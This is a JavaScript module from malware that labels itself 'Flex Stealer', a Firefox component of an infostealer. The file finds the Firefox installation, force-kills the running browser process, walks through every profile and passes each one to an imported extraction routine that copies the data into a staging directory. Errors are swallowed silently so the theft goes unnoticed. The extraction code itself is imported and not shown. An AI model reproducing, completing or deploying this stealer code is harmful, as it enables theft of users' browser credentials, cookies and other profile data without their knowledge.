const fs = require('fs-extra');
const path = require('path');
const { getFirefoxPath, getFirefoxProfiles } = require('../browser_utils/paths');
const { extractFirefoxData } = require('../browser_utils/firefox_extractor');
const { isProcessRunning, killProcess } = require('../browser_utils/process-manager');

/**
 * Flex Stealer | 2026 - Firefox Module
 * Specializes in Gecko-based browser profile extraction.
 */

async function run(stagingDir) {
    const firefoxRoot = getFirefoxPath();
    if (!fs.existsSync(firefoxRoot)) return null;

    try {
        if (await isProcessRunning('firefox.exe')) {
            await killProcess('firefox.exe');
        }

        const profiles = getFirefoxProfiles(firefoxRoot);
        const results = [];

        for (const profile of profiles) {
            const data = await extractFirefoxData(profile, stagingDir);
            results.push({ profile: profile.name, ...data });
        }
        return results;
    } catch (err) {
        // Silently continue
    }
    return null;
}

module.exports = {
    run
};